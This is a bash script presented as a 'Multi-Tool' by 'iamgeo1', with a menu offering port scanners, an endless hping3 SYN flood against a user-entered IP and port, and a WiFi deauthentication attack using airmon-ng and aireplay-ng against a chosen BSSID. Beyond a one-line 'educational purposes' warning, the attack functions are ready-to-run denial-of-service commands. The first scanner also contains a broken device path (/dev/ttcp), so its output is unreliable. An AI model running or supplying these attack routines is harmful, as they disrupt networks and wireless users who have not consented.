#!/bin/bash

# Initialize ANSI color codes
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'

# ASCII Art banner (can replace with figlet or a predefined string)
echo -e "${CYAN}Welcome to the Multi-Tool!${RESET}"
echo -e "${CYAN}Developed by iamgeo1${RESET}"

# Main menu function
main_menu() {
    while true; do
        echo -e "\n--- Main Menu ---"
        echo "0 - Port Scanner"
        echo "1 - DDOS Attack"
        echo "2 - Port Scanner (Colorized)"
        echo "4 - DoS Attack Tool"
        echo "5 - Exit"

        read -p "Enter your choice: " choice

        case $choice in
            0) program0 ;;
            1) program1 ;;
            2) program2 ;;
            4) program4 ;;
            5) echo "Exiting the program."; exit ;;
            *) echo "Invalid choice. Please try again." ;;
        esac
    done
}

# Port Scanner
program0() {
    echo -e "${BLUE}Port Scanner - Made by iamgeo1${RESET}"

    read -p "Target IP: " target_ip
    read -p "Start Port: " start_port
    read -p "End Port: " end_port

    echo "Scanning IP: $target_ip from port $start_port to $end_port..."

    for (( port=$start_port; port<=$end_port; port++ )); do
        (echo >/dev/ttcp/$target_ip/$port) &>/dev/null && echo "Port $port: OPEN" || echo "Port $port: CLOSED"
    done
}

# DDOS Attack
program1() {
    echo -e "${RED}DDOS Attack Tool - Made by iamgeo1${RESET}"
    echo "WARNING: This tool is only for educational purposes!"

    read -p "Target IP: " ip
    read -p "Port: " port

    echo "Starting the attack on $ip at port $port..."
    sleep 5

    # Using hping3 to perform DDOS attack
    while true; do
        hping3 -S --flood -V -p $port $ip
    done
}

# Colorized Port Scanner
program2() {
    echo -e "${CYAN}Port Scanner (Colorized) - Made by iamgeo1${RESET}"
    read -p "${RED}Target IP: " target_ip
    read -p "${YELLOW}Start Port: " start_port
    read -p "${YELLOW}End Port: " end_port

    for (( port=$start_port; port<=$end_port; port++ )); do
        (echo >/dev/tcp/$target_ip/$port) &>/dev/null && echo -e "${CYAN}Port $port is OPEN${RESET}" || echo "Port $port is CLOSED"
    done
}

# DoS Attack Tool (Using aireplay-ng)
program4() {
    echo -e "${BLUE}DoS Attack Tool - Made by iamgeo1${RESET}"

    # Check for root privileges
    if [[ $EUID -ne 0 ]]; then
       echo -e "${RED}This script must be run as root${RESET}" 
       exit 1
    fi

    echo "Launching DoS attack (deauthentication) with aireplay-ng..."
    read -p "Enter the target BSSID: " bssid
    read -p "Enter the WiFi interface (e.g., wlan0): " interface

    # Switch to monitor mode and start deauth attack
    airmon-ng start $interface
    aireplay-ng --deauth 0 -a $bssid $interface
}

# Start the main menu
main_menu
